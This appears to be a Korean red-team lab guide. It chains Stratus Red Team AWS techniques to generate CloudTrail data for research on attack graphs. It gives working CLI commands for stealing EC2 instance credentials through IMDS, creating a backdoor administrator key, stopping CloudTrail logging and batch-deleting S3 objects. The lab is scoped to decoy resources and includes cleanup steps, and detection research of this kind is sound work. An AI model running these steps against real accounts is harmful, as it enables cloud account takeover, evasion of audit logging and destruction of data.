# 옵션 2 킬체인 구성 가이드 — 크리덴셜 핸드오프

> 5개 기법을 **크리덴셜 스파인**으로 엮어 하나의 방향성 APT 그래프를 만든다.
> 시나리오: **과도한 권한의 EC2 역할이 탈취되어 계정 전체가 장악되고 데이터가 파괴**된다.

---

## 0. 핵심 원리

그래프에서 단계가 이어지는 건 **연속된 이벤트가 같은 `accessKeyId`를 공유**하기 때문이다. 그래서 "다음 단계를 이전 단계에서 얻은 크리덴셜로 실행"하는 것이 전부다. 이 체인에는 **크리덴셜 핸드오프가 2번** 있다.

```
instance(i-xxxx)
   └─BOUND_TO─ Cred①(ASIA…, 탈취한 인스턴스 역할)
                 ├─PERFORMED─ [정찰]  GetCallerIdentity / ListRoles / ListObjects
                 └─PERFORMED─ [권한상승] CreateUser → AttachUserPolicy → CreateAccessKey
                                                              │
                                                     ISSUED_CREDENTIAL
                                                              ▼
                                        Cred②(AKIA…, 백도어 관리자 키)
                                          ├─PERFORMED─ [회피]  StopLogging ─TARGETS─ trail(decoy)
                                          └─PERFORMED─ [임팩트] DeleteObjects ─TARGETS─ bucket(victim)
```

- **Cred①**(탈취한 임시키)로 정찰하고 관리자 사용자를 만든다.
- 그 `CreateAccessKey`가 **Cred②**(영구 관리자키)를 발급한다(`ISSUED_CREDENTIAL` 엣지).
- **Cred②**로 로그를 끄고 데이터를 지운다.

두 크리덴셜 노드가 `ISSUED_CREDENTIAL`로 이어져 **끊기지 않는 방향성 경로**가 된다. 이게 standalone 5개(각자 원래 IAM 사용자에 매달림)와 근본적으로 다른 점이다.

### 왜 권한상승을 끼우나
탈취한 인스턴스 역할(Cred①)은 보통 CloudTrail·S3 전체 삭제 권한이 없다. 그래서 **먼저 관리자 백도어(Cred②)를 만들어 권한을 확보한 뒤** 회피·임팩트로 간다. 이게 현실적이고, 그래프도 2-크리덴셜로 더 풍부해진다.

---

## 1. 실행 전략 — Stratus warmup + 수동 핸드오프

각 기법의 **리소스 준비는 Stratus warmup**으로 하고, **악성 행위는 원하는 크리덴셜로 직접 AWS CLI 실행**한다. 이래야 (a) 리소스 세팅이 편하고 (b) 어떤 크리덴셜이 무엇을 하는지 완전히 통제된다.

| 단계 | 전술 | 실행 크리덴셜 | 방법 |
|---|---|---|---|
| 1 탈취 | Credential Access | (원래 주체) | 수동 SSM으로 IMDS curl → Cred① 확보 |
| 2 정찰 | Discovery | **Cred①** | 수동 CLI |
| 3 권한상승·지속성 | PrivEsc / Persistence | **Cred①** | 수동 CLI → Cred② 발급 |
| 4 회피 | Defense Evasion | **Cred②** | 수동 CLI (Stratus warmup이 만든 decoy 트레일 중지) |
| 5 임팩트 | Impact | **Cred②** | 수동 CLI (Stratus warmup이 만든 victim 버킷 삭제) |

---

## 2. 사전 준비 (Phase A)

### 2-1. 취약 인스턴스 + 과도한 권한 역할
```bash
# 인스턴스·역할·SSM 준비 (detonate는 하지 않음)
stratus warmup aws.credential-access.ec2-steal-instance-credentials

# 인스턴스 ID와 역할명 확인
INSTANCE_ID=$(aws ec2 describe-instances \
  --filters "Name=tag:StratusRedTeam,Values=true" "Name=instance-state-name,Values=running" \
  --query "Reservations[].Instances[].InstanceId" --output text)
ROLE_NAME=stratus-red-team-ec2-steal-credentials-role   # 로그에서 확인된 이름
echo "$INSTANCE_ID / $ROLE_NAME"
```

**과도한 권한(=취약점)을 역할에 부여** — 정찰 + 관리자 생성까지 가능하게:
```bash
cat > pivot.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "sts:GetCallerIdentity",
      "iam:ListRoles","iam:ListUsers","iam:GetAccountSummary","iam:ListAccessKeys",
      "s3:ListAllMyBuckets","s3:ListBucket",
      "iam:CreateUser","iam:AttachUserPolicy","iam:CreateAccessKey"
    ],
    "Resource": "*"
  }]
}
EOF
aws iam put-role-policy --role-name "$ROLE_NAME" \
  --policy-name chain-pivot --policy-document file://pivot.json
```
> 현실의 "인스턴스 역할에 `iam:*`가 붙어 있는" 오설정을 재현한 것이다.

### 2-2. decoy 트레일 (회피 단계용)
```bash
# 공격자가 끌 '희생용' 트레일을 warmup으로 생성 (StartLogging까지 됨)
stratus warmup aws.defense-evasion.cloudtrail-stop
DECOY_TRAIL=$(aws cloudtrail list-trails \
  --query "Trails[?contains(Name, 'ct-stop')].Name | [0]" --output text)
echo "decoy: $DECOY_TRAIL"
```

### 2-3. victim 버킷 + 데이터 (임팩트 단계용)
```bash
# 삭제 대상이 될 데이터 버킷을 warmup으로 생성 (파일 업로드까지 됨, 삭제 안 함)
stratus warmup aws.impact.s3-ransomware-batch-deletion
VICTIM_BUCKET=$(aws s3api list-buckets \
  --query "Buckets[?starts_with(Name,'stratus-red-team-ransomware-bucket')].Name | [0]" --output text)
echo "victim: $VICTIM_BUCKET"
```

### 2-4. 연구용 트레일 확인 (수집 담당 — 절대 끄지 말 것)
- **다중 리전** + **글로벌 서비스 이벤트** ON (IAM 이벤트는 us-east-1)
- **S3 데이터 이벤트(읽기+쓰기)** ON (임팩트 단계가 데이터 이벤트라 필수)
- 이 트레일은 4단계에서 끄는 decoy와 **다른 트레일**이어야 한다. 공격자는 decoy를 끄고, 연구 트레일은 살아남아 전부 기록한다.

---

## 3. 체인 실행 (Phase B~C)

### 3-1. [1단계·탈취] 인스턴스 크리덴셜 훔치기 → Cred①
IMDSv2에서 역할 크리덴셜을 꺼내온다(= steal-instance-credentials를 수동으로).
```bash
cat > steal.json <<'EOF'
{"commands":[
  "TOKEN=$(curl -sX PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 300')",
  "ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
  "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
]}
EOF
CMD=$(aws ssm send-command --instance-ids "$INSTANCE_ID" \
  --document-name AWS-RunShellScript --parameters file://steal.json \
  --query "Command.CommandId" --output text)
sleep 6
aws ssm get-command-invocation --command-id "$CMD" --instance-id "$INSTANCE_ID" \
  --query "StandardOutputContent" --output text
# → {"AccessKeyId":"ASIA…","SecretAccessKey":"…","Token":"…","Expiration":"…"} 출력
```

출력된 값을 **환경변수로 export** (= 크리덴셜 핸드오프 ①):
```bash
export AWS_ACCESS_KEY_ID=ASIA…
export AWS_SECRET_ACCESS_KEY=…
export AWS_SESSION_TOKEN=…

# 확인: arn이 assumed-role/…/<instance-id> 로 끝나야 함
aws sts get-caller-identity
```
> ⏰ 임시키는 만료(최대 6h)가 있으니 2~3단계는 곧바로 진행.

### 3-2. [2단계·정찰] Cred①로 계정 훑기
```bash
aws sts get-caller-identity
aws iam list-roles     --max-items 50
aws iam list-users     --max-items 50
aws iam get-account-summary
aws s3 ls
aws s3 ls "s3://$VICTIM_BUCKET"     # victim 버킷을 TARGETS로 연결
```
→ 이벤트들의 `accessKeyId` = **ASIA…** (Cred①). arn은 인스턴스에 결속.

### 3-3. [3단계·권한상승/지속성] Cred①로 관리자 백도어 생성 → Cred②
```bash
aws iam create-user --user-name apt-backdoor-admin
aws iam attach-user-policy --user-name apt-backdoor-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name apt-backdoor-admin
# → responseElements.accessKey 에 새 AKIA… (Cred②) 발급
```
출력된 새 키를 export (= 크리덴셜 핸드오프 ②):
```bash
export AWS_ACCESS_KEY_ID=AKIA…      # 새 관리자 키
export AWS_SECRET_ACCESS_KEY=…
unset AWS_SESSION_TOKEN             # 영구키는 세션토큰 없음

aws sts get-caller-identity        # arn이 user/apt-backdoor-admin 이어야 함
```
> 그래프에서 이 `CreateAccessKey` 이벤트가 Cred① → Cred②를 잇는 `ISSUED_CREDENTIAL` 엣지가 된다.

### 3-4. [4단계·회피] Cred②로 decoy 트레일 중지
```bash
aws cloudtrail stop-logging --name "$DECOY_TRAIL"
```
→ `StopLogging` 이벤트의 `accessKeyId` = **AKIA…** (Cred②). **연구 트레일은 계속 기록** 중이라 이 이벤트가 남는다.

### 3-5. [5단계·임팩트] Cred②로 victim 버킷 삭제
```bash
# 배치 삭제용 객체 목록 만들기
aws s3api list-object-versions --bucket "$VICTIM_BUCKET" \
  --query '{Objects: Versions[].{Key:Key,VersionId:VersionId}}' \
  --output json > del.json

aws s3api delete-objects --bucket "$VICTIM_BUCKET" --delete file://del.json
```
→ `DeleteObjects`(데이터 이벤트)의 `accessKeyId` = **AKIA…** (Cred②), `resources[].ARN` = victim 버킷.

---

## 4. 수집 (Phase D)

- 5단계 후 **15분 대기**(CloudTrail S3 전달 + 데이터 이벤트 지연) 후 로그 수집.
- 수집 구간: 1단계(SSM) ~ 5단계(DeleteObjects) 전체.
- 수집이 끝난 뒤에만 cleanup(아래).
- raw_log 폴더에 넣어주면 시나리오 단위로 정리·그래프 검증.

---

## 5. 정리 (Phase E)
```bash
# 백도어 사용자 (수동 생성분)
aws iam detach-user-policy --user-name apt-backdoor-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
for k in $(aws iam list-access-keys --user-name apt-backdoor-admin \
  --query "AccessKeyMetadata[].AccessKeyId" --output text); do
  aws iam delete-access-key --user-name apt-backdoor-admin --access-key-id $k; done
aws iam delete-user --user-name apt-backdoor-admin

# 역할에 붙인 pivot 정책
aws iam delete-role-policy --role-name "$ROLE_NAME" --policy-name chain-pivot

# Stratus warmup 리소스 일괄
stratus cleanup --all
```
> ⚠️ 원래 자격증명(관리자/원 IAM 사용자)으로 돌아와서 cleanup 할 것. Cred②(백도어)는 위에서 이미 지워짐.

---

## 6. 완성될 그래프 (검증 쿼리)

```cypher
// 크리덴셜 스파인 전체 경로
MATCH (i:Entity {entityType:'instance'})<-[:BOUND_TO]-(c1:Actor {actorKind:'Credential'})
MATCH (c1)-[:PERFORMED]->(issue:Event {eventName:'CreateAccessKey'})-[:ISSUED_CREDENTIAL]->(c2:Actor)
MATCH (c2)-[:PERFORMED]->(impact:Event)
WHERE impact.eventName IN ['StopLogging','DeleteObjects']
RETURN i, c1, issue, c2, impact
```

기대 결과:
```
instance ─BOUND_TO─ Cred①(ASIA) ─PERFORMED─ CreateAccessKey ─ISSUED_CREDENTIAL─▶ Cred②(AKIA)
                     │                                                              ├─▶ StopLogging ─▶ trail(decoy)
                     ├─▶ GetCallerIdentity/ListRoles/ListObjects                    └─▶ DeleteObjects ─▶ bucket(victim)
                     └─▶ CreateUser/AttachUserPolicy
```

각 단계 이벤트의 `accessKeyId`가 순서대로 ASIA → ASIA → ASIA → AKIA → AKIA 로 바뀌는 것이 핸드오프의 증거다.

---

## 7. 반드시 지킬 것 (gotcha)

| 항목 | 이유 |
|---|---|
| **연구 트레일 ≠ decoy 트레일** | 4단계에서 연구 트레일을 끄면 이후(임팩트) 로그가 사라진다 |
| **S3 데이터 이벤트 ON** | 5단계 `DeleteObjects`는 데이터 이벤트. 안 켜면 임팩트가 그래프에 없음 |
| **다중 리전 + 글로벌 이벤트** | 3단계 IAM 이벤트는 us-east-1에 기록됨 |
| **임시키 만료(~6h)** | 1→2→3단계는 지체 없이 진행 |
| **핸드오프 시 SESSION_TOKEN** | Cred①(ASIA)는 필요, Cred②(AKIA)는 `unset` |
| **victim 버킷 버전관리** | 삭제가 delete marker가 될 수 있음 — 로그엔 DeleteObjects로 남음(문제 없음) |
| **cleanup은 원 크리덴셜로** | 백도어/임시키로는 정리 권한이 꼬일 수 있음 |
